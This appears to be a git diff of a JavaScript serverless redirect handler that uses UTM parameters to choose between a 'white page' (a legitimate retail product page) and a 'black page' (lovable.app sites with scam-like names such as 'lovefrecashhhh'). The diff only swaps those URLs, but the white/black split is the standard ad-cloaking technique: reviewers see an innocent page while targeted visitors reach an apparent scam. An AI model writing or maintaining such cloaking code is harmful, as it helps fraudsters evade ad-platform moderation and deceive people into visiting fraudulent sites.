@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.wantitall.co.za/HISTOYE-Baby-Crawling-Toys-Baby-Toys-612-Months-Bilingual-Toys-Spanish-English-Infant-Toddler-Toys-36-612-1218-ap-B096FT7PPP.html";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
+    const whitePageURL = "https://www.ikea.com/at/en/p/skogsta-chair-black-50544867/";
+    const blackPageURL = "https://instentquzzz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,3 +26,4 @@ export default function handler(req, res) {
     res.end();
 
   }
+
